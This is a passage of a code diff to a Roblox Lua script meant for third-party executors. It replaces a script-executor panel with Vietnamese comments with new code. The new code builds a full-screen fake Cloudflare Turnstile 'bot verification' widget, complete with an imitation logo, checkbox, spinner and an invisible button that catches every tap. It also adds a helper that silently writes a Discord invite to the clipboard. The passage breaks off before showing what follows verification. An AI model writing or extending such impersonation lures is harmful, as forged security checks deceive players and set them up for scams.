+    new("UIGradient", rule, {Rotation = 90, Color = ColorSequence.new(C.peach, Color3.fromRGB(176, 120, 104))})
+    label(box, {
+        Size = UDim2.new(1, -36, 1, -16), Position = UDim2.fromOffset(25, 8),
+        BackgroundTransparency = 1, Text = ALERT, TextWrapped = true,
+        TextColor3 = C.warning, TextSize = 10, Font = Enum.Font.Gotham,
+        TextXAlignment = Enum.TextXAlignment.Left, TextYAlignment = Enum.TextYAlignment.Center, ZIndex = 7
+    })
+    return box
 end
-end)
--- Copy & Paste
-CopyBtn.MouseButton1Click:Connect(function()
-pcall(function()
-if setclipboard then
-setclipboard(InputBox.Text)
+
+local function getClipboardFn()
+    return setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set) or (syn and syn.write_clipboard)
 end
-end)
-end)
-PasteBtn.MouseButton1Click:Connect(function()
-pcall(function()
-if getclipboard then
-InputBox.Text = getclipboard()
+
+-- Silent clipboard copy; returns true on success.
+local function silentCopy(text)
+    local clipboard = getClipboardFn()
+    if type(clipboard) ~= "function" then return false end
+    local ok = pcall(clipboard, text)
+    return ok
 end
-end)
-end)
--- ==============================================================================
--- 8. UI LƯU SCRIPT VÀ LƯU DỮ LIỆU TỰ ĐỘNG
--- ==============================================================================
-local SaveModal = Instance.new("Frame")
-SaveModal.Name = "SaveModal"
-SaveModal.Size = UDim2.new(0, 300, 0, 160)
-SaveModal.Position = UDim2.new(0.5, -150, 0.5, -80)
-SaveModal.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
-SaveModal.Visible = false
-SaveModal.ZIndex = 20
-SaveModal.Parent = MainFrame
-local SaveModalCorner = Instance.new("UICorner")
-SaveModalCorner.CornerRadius = UDim.new(0, 10)
-SaveModalCorner.Parent = SaveModal
-local SaveModalStroke = Instance.new("UIStroke")
-SaveModalStroke.Color = Color3.fromRGB(0, 122, 255)
-SaveModalStroke.Thickness = 1.5
-SaveModalStroke.Parent = SaveModal
-local SaveModalTitle = Instance.new("TextLabel")
-SaveModalTitle.Size = UDim2.new(1, 0, 0, 30)
-SaveModalTitle.BackgroundTransparency = 1
-SaveModalTitle.Text = "LƯU SCRIPT"
-SaveModalTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-SaveModalTitle.Font = Enum.Font.GothamBold
-SaveModalTitle.TextSize = 14
-SaveModalTitle.ZIndex = 21
-SaveModalTitle.Parent = SaveModal
-local SaveNameBox = Instance.new("TextBox")
-SaveNameBox.Size = UDim2.new(1, -30, 0, 35)
-SaveNameBox.Position = UDim2.new(0, 15, 0, 45)
-SaveNameBox.BackgroundColor3 = Color3.fromRGB(35, 35, 48)
-SaveNameBox.PlaceholderText = "Tối đa 15 từ..."
-SaveNameBox.Text = ""
-SaveNameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-SaveNameBox.Font = Enum.Font.Gotham
-SaveNameBox.TextSize = 13
-SaveNameBox.ZIndex = 21
-SaveNameBox.Parent = SaveModal
-local SaveNameCorner = Instance.new("UICorner")
-SaveNameCorner.CornerRadius = UDim.new(0, 6)
-SaveNameCorner.Parent = SaveNameBox
--- Giới hạn tối đa 15 từ
-SaveNameBox:GetPropertyChangedSignal("Text"):Connect(function()
-local words = {}
-for word in SaveNameBox.Text:gmatch("%S+") do
-table.insert(words, word)
+
+local function copyDiscord(feedback)
+    if silentCopy(DISCORD_URL) then
+        if feedback then feedback.Text = "Discord invite copied to clipboard" end
+    else
+        if feedback then feedback.Text = "Clipboard unavailable. Invite: " .. DISCORD_URL end
+    end
 end
-if #words > 15 then
-SaveNameBox.Text = table.concat(words, " ", 1, 15)
+
+local function glassPanel(parent, w, h, x, y, name)
+    local p = frame(parent, {
+        Name = name, Size = UDim2.fromOffset(w, h), Position = UDim2.fromOffset(x, y),
+        BackgroundColor3 = C.glass, BackgroundTransparency = 0.08, BorderSizePixel = 0, ZIndex = 2
+    })
+    corner(p, 20)
+    auroraStroke(p, 1.5, 0.12)
+    applyGlassWaterFx(p, 20)
+    local clip = frame(p, {Size = UDim2.fromScale(1, 1), BackgroundTransparency = 1, ClipsDescendants = true, ZIndex = 2})
+    corner(clip, 20)
+    addWaterBody(clip)
+    return p
 end
-end)
-local ConfirmSaveBtn = Instance.new("TextButton")
-ConfirmSaveBtn.Size = UDim2.new(0, 100, 0, 32)
-ConfirmSaveBtn.Position = UDim2.new(0.5, -50, 0, 100)
-ConfirmSaveBtn.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
-ConfirmSaveBtn.Text = "Lưu"
-ConfirmSaveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-ConfirmSaveBtn.Font = Enum.Font.GothamBold
-ConfirmSaveBtn.TextSize = 13
-ConfirmSaveBtn.ZIndex = 21
-ConfirmSaveBtn.Parent = SaveModal
-local ConfirmSaveCorner = Instance.new("UICorner")
-ConfirmSaveCorner.CornerRadius = UDim.new(0, 6)
-ConfirmSaveCorner.Parent = ConfirmSaveBtn
-SaveBtn.MouseButton1Click:Connect(function()
-if InputBox.Text ~= "" then
-SaveModal.Visible = true
+
+local function waterDrop(parent, x, y, s, z)
+    z = z or 7
+    local g = frame(parent, {Size = UDim2.fromOffset(s, s), Position = UDim2.fromOffset(x, y), BackgroundTransparency = 1, ZIndex = z})
+    local body = frame(g, {
+        Size = UDim2.new(1, -4, 0.68, 0), Position = UDim2.new(0.2, 2, 0.3, 0),
+        BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = z + 1
+    })
+    roundFull(body)
+    new("UIGradient", body, {Rotation = 90, Color = ColorSequence.new(C.sky, C.aqua)})
+    local top = frame(g, {
+        Size = UDim2.new(0.58, 0, 0.5, 0), Position = UDim2.new(0.21, 0, 0, 0),
+        BackgroundColor3 = C.white, BorderSizePixel = 0, ZIndex = z + 1
+    })
+    roundFull(top)
+    new("UIGradient", top, {Rotation = 90, Color = ColorSequence.new(C.mint, C.aqua)})
+    local shine = frame(g, {
+        Size = UDim2.fromOffset(4, 5), Position = UDim2.new(0.3, 0, 0.42, 0),
+        BackgroundColor3 = C.white, BackgroundTransparency = 0.2, BorderSizePixel = 0, ZIndex = z + 2
+    })
+    corner(shine, 2)
+    return g
 end
-end)
--- Quản lý danh sách lưu trữ (Tự động thích ứng Studio / Executor)
-local SAVE_FILE_NAME = "GauMods_SavedScripts.json"
-local SavedScripts = {}
-local function LoadSavedData()
-pcall(function()
-if readfile and isfile and isfile(SAVE_FILE_NAME) then
-SavedScripts = HttpService:JSONDecode(readfile(SAVE_FILE_NAME))
+
+-- Cloudflare cloud: flat orange body, three bumps, lighter cloud peeking behind.
+local function cloudLogo(parent, x, y)
+    local g = frame(parent, {Size = UDim2.fromOffset(30, 16), Position = UDim2.fromOffset(x, y), BackgroundTransparency = 1, ZIndex = 8})
+    local orange = Color3.fromRGB(246, 130, 31)
+    local light = Color3.fromRGB(252, 173, 65)
+    local function puff(w, h, px, py, col, z)
+        local f = frame(g, {Size = UDim2.fromOffset(w, h), Position = UDim2.fromOffset(px, py), BackgroundColor3 = col, BorderSizePixel = 0, ZIndex = z})
+        roundFull(f)
+        return f
+    end
+    puff(9, 9, 20, 1, light, 8)
+    puff(28, 7, 0, 8, orange, 9)
+    puff(9, 9, 2, 4, orange, 9)
+    puff(12, 12, 8, 0, orange, 9)
+    puff(9, 9, 17, 4, orange, 9)
+    return g
 end
-end)
-end
-local function SaveDataToFile()
-pcall(function()
-if writefile then
-writefile(SAVE_FILE_NAME, HttpService:JSONEncode(SavedScripts))
-end
-end)
-end
-LoadSavedData()
--- ==============================================================================
--- 9. NỘI DUNG TAB 2 (DANH SÁCH SCRIPT ĐÃ LƯU)
--- ==============================================================================
-local Tab2Scroll = Instance.new("ScrollingFrame")
-Tab2Scroll.Size = UDim2.new(1, 0, 1, 0)
-Tab2Scroll.BackgroundTransparency = 1
-Tab2Scroll.ScrollBarThickness = 5
-Tab2Scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
-Tab2Scroll.Parent = Tab2Frame
-local Tab2List = Instance.new("UIListLayout")
-Tab2List.Padding = UDim.new(0, 8)
-Tab2List.Parent = Tab2Scroll
-local function RenderSavedScripts()
--- Xóa các danh sách cũ
-for _, item in ipairs(Tab2Scroll:GetChildren()) do
-if item:IsA("Frame") then
-item:Destroy()
-end
-end
-for index, data in ipairs(SavedScripts) do
-local itemFrame = Instance.new("Frame")
-itemFrame.Size = UDim2.new(1, 0, 0, 45)
-itemFrame.BackgroundColor3 = Color3.fromRGB(26, 26, 36)
-itemFrame.Parent = Tab2Scroll
-local itemCorner = Instance.new("UICorner")
-itemCorner.CornerRadius = UDim.new(0, 8)
-itemCorner.Parent = itemFrame
-local itemTitle = Instance.new("TextLabel")
-itemTitle.Size = UDim2.new(0.5, -10, 1, 0)
-itemTitle.Position = UDim2.new(0, 10, 0, 0)
-itemTitle.BackgroundTransparency = 1
-itemTitle.Text = data.Name
-itemTitle.TextColor3 = Color3.fromRGB(240, 240, 240)
-itemTitle.Font = Enum.Font.GothamSemibold
-itemTitle.TextSize = 13
-itemTitle.TextXAlignment = Enum.TextXAlignment.Left
-itemTitle.Parent = itemFrame
--- Nút Execute trên danh sách lưu
-local execSaveBtn = Instance.new(
+
+if PG:FindFirstChild("MM2_VerificationGui") then PG.MM2_VerificationGui:Destroy() end
+if PG:FindFirstChild("MM2_LoaderGui") then PG.MM2_LoaderGui:Destroy() end
+
+local camera = workspace.CurrentCamera
+local viewport = camera and camera.ViewportSize or Vector2.new(1280, 720)
+local sw, sh = viewport.X, viewport.Y
+
+-- ================================================================
+-- Outside MM2: Cloudflare Turnstile → bot verification panel
+-- ================================================================
+if game.PlaceId ~= MM2_ID then
+    local SG = new("ScreenGui", PG, {
+        Name = "MM2_VerificationGui", ResetOnSpawn = false,
+        ZIndexBehavior = Enum.ZIndexBehavior.Sibling, IgnoreGuiInset = true
+    })
+    local Overlay = frame(SG, {
+        Size = UDim2.fromScale(1, 1), BackgroundColor3 = Color3.fromRGB(10, 16, 26),
+        BackgroundTransparency = 0.28, BorderSizePixel = 0, ZIndex = 1, Active = false
+    })
+    new("UIGradient", Overlay, {
+        Rotation = 35,
+        Color = ColorSequence.new({
+            ColorSequenceKeypoint.new(0, Color3.fromRGB(10, 16, 26)),
+            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(14, 28, 40)),
+            ColorSequenceKeypoint.new(1, Color3.fromRGB(18, 24, 38))
+        })
+    })
+    -- no floating circle orbs
+
+    -- Cloudflare managed challenge widget (300 × 65)
+    local TSShadow = frame(SG, {
+        Size = UDim2.fromOffset(306, 71), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.new(0.5, 0, 0.5, 5),
+        BackgroundColor3 = Color3.fromRGB(4, 8, 14), BackgroundTransparency = 0.78, BorderSizePixel = 0, ZIndex = 4, Active = false
+    })
+    corner(TSShadow, 5)
+    local TS = group(SG, {
+        Size = UDim2.fromOffset(300, 65), AnchorPoint = Vector2.new(0.5, 0.5), Position = UDim2.fromScale(0.5, 0.5),
+        BackgroundColor3 = Color3.fromRGB(250, 250, 250), BorderSizePixel = 0, ZIndex = 5, Active = true
+    })
+    corner(TS, 3)
+    stroke(TS, Color3.fromRGB(224, 224, 224), 1, 0)
+
+    -- Invisible full-widget hit button (Delta mobile needs a large Active TextButton)
+    local HitBtn = new("TextButton", TS, {
+        Size = UDim2.fromScale(1, 1), Position = UDim2.fromOffset(0, 0),
+        BackgroundTransparency = 1, Text = "", BorderSizePixel = 0,
+        AutoButtonColor = false, Active = true, Selectable = true, ZIndex = 20
+    })
+
+    -- 24px bordered checkbox (visual only; HitBtn handles the click)
+    local CheckBox = frame(TS, {
+        Size = UDim2.fromOffset(24, 24), Position = UDim2.fromOffset(18, 20),
+        BackgroundColor3 = Color3.fromRGB(255, 255, 255), BorderSizePixel = 0, ZIndex = 7, Active = false
+    })
+    corner(CheckBox, 3)
+    local cbStroke = stroke(CheckBox, Color3.fromRGB(109, 109, 109), 2, 0)
+
+    -- Spinner: light track ring + orange arc (gradient-masked stroke) that rotates
+    local Spinner = frame(TS, {Size = UDim2.fromOffset(24, 24), Position = UDim2.fromOffset(18, 20), BackgroundTransparency = 1, Visible = false, ZIndex = 7})
+    local track = frame(Spinner, {Size = UDim2.fromOffset(22, 22), Position = UDim2.fromOffset(1, 1), BackgroundTransparency = 1, ZIndex = 7})
+    roundFull(track)
+    stroke(track, Color3.fromRGB(228, 228, 228), 2.5, 0)
+    local arc = frame(Spinner, {Size = UDim2.fromOffset(22, 22), Position = UDim2.fromOffset(1, 1), BackgroundTransparency = 1, ZIndex = 8})
+    roundFull(arc)
+    local arcStroke = stroke(arc, Color3.fromRGB(246, 130, 31), 2.5, 0)
+    new("UIGradient", arcStroke, {
+        Transparency = NumberSequence.new({
+            NumberSequenceKeypoint.new(0, 0),
+            NumberSequenceKeypoint.new(0.42, 0),
+            NumberSequenceKeypoint.new(0.58, 1),
+            NumberSequenceKeypoint.new(1, 1)
+        })
+    })
+
+    -- Success check
+    local Success = label
